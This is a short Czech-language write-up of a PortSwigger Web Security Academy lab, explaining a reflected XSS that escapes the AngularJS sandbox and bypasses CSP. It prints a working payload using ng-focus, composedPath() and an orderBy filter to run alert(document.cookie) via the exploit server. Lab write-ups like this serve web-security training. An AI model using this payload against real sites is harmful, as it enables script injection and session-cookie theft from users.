# Lab: Reflected XSS with AngularJS sandbox escape and CSP
Tento dokument slouží jako studijní materiál a záznam z PortSwigger Web Security Academy.

 tahák popisuje úspěšné obejití Content Security Policy (CSP) a AngularJS sandboxu pomocí Reflected XSS.

##  Postup útoku (Walkthrough)

1. **Otevření Exploit Serveru:** V horní části stránky labu klikni na tlačítko **Exploit server**.
2. **Vložení payloadu:** Do pole **Body** vlož následující skript (nezapomeň si nahradit URL za ID své aktuální laboratoře):

   ```html
   <script>
   location='[https://0a680091048dbfa38161579700a300cf.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath](https://0a680091048dbfa38161579700a300cf.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath)()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
   </script>

# Proč to fungovalo?

Reflected XSS: Vložený <input> se přes parametr search vyrenderoval přímo do stránky.

AngularJS sandbox escape: Stránka používala starší AngularJS, takže jsem přes ng-focus a kotvu #x vyvolal událost.

Bypass přes orderBy: Pomocí filtru orderBy a composedPath() se obešel sandbox, spustil se kód alert(document.cookie) a vytáhly se session cookies oběti. 